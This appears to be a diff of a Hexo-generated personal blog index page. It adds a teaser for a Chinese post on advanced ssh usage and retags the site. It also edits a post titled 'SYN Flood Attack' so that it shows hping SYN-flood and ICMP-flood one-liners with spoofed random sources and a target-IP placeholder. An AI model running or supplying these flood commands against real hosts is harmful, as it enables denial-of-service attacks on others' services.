@@ -79,7 +79,7 @@
 						<li>Links</li>
 						
 						
-						<li>Über</li>
+						<li>About</li>
 						
 					</ul>
 				</div>
@@ -116,7 +116,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/DDOS/" style="font-size: 10px;">DDOS</a> <a href="/tags/Destroy/" style="font-size: 10px;">Destroy</a> <a href="/tags/breeze/" style="font-size: 10px;">breeze</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/getshell/" style="font-size: 10px;">getshell</a> <a href="/tags/hello-world/" style="font-size: 10px;">hello world</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/phpmyadmin/" style="font-size: 10px;">phpmyadmin</a> <a href="/tags/plasma/" style="font-size: 10px;">plasma</a> <a href="/tags/python/" style="font-size: 16.67px;">python</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tar/" style="font-size: 10px;">tar</a> <a href="/tags/tools/" style="font-size: 20px;">tools</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xz/" style="font-size: 10px;">xz</a> <a href="/tags/为什么/" style="font-size: 10px;">为什么</a> <a href="/tags/勿在浮沙筑高台/" style="font-size: 13.33px;">勿在浮沙筑高台</a>
+						<a href="/tags/DDOS/" style="font-size: 10px;">DDOS</a> <a href="/tags/Destroy/" style="font-size: 10px;">Destroy</a> <a href="/tags/breeze/" style="font-size: 10px;">breeze</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/getshell/" style="font-size: 10px;">getshell</a> <a href="/tags/google/" style="font-size: 10px;">google</a> <a href="/tags/hello-world/" style="font-size: 10px;">hello world</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/manual/" style="font-size: 10px;">manual</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/phpmyadmin/" style="font-size: 10px;">phpmyadmin</a> <a href="/tags/plasma/" style="font-size: 10px;">plasma</a> <a href="/tags/python/" style="font-size: 16.67px;">python</a> <a href="/tags/scp/" style="font-size: 10px;">scp</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tar/" style="font-size: 10px;">tar</a> <a href="/tags/tools/" style="font-size: 20px;">tools</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xz/" style="font-size: 10px;">xz</a> <a href="/tags/为什么/" style="font-size: 10px;">为什么</a> <a href="/tags/勿在浮沙筑高台/" style="font-size: 13.33px;">勿在浮沙筑高台</a>
 					</div>
 				</section>
 				
@@ -194,6 +194,69 @@
 
       <div class="body-wrap">
   
+    <article id="post-ssh-高级用法" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/05/31/ssh-高级用法/" class="article-date">
+  	<time datetime="2016-05-31T01:46:41.000Z" itemprop="datePublished">2016-05-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/05/31/ssh-高级用法/">ssh 高级用法</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="ssh-tips"><a href="#ssh-tips" class="headerlink" title="ssh tips"></a>ssh tips</h2><ul>
+<li>linux 用户应该都很熟悉ssh, 但有些高级用法未必知道.</li>
+<li>本文总结了一些自己常用的ssh高级用法, =.= 好吧, 其实也没那么高级…</li>
+</ul>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/scp/">scp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssh/">ssh</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a  href="/2016/05/31/ssh-高级用法/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-SYN-Flood-Attack" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -220,7 +283,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="SYN-Flood-Attack"><a href="#SYN-Flood-Attack" class="headerlink" title="SYN Flood Attack"></a>SYN Flood Attack</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hping -c 1000 <span class="_">-d</span> 120 -S -w 65535 -p 135 --flood --rand-source</span><br></pre></td></tr></table></figure>
+        <h2 id="SYN-Flood-Attack"><a href="#SYN-Flood-Attack" class="headerlink" title="SYN Flood Attack"></a>SYN Flood Attack</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping -c 1000 <span class="_">-d</span> 120 -S -w 65535 -p 135 --flood --rand-source [Target IP]</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping --icmp -C 3 -K 3 --rand-source --flood [Target IP]</span><br></pre></td></tr></table></figure>
 <ul>
 <li><p>文档</p>
 <p>  hping --help</p>
@@ -577,7 +641,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2016 xyz
+    		&copy; 2017 xyz
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
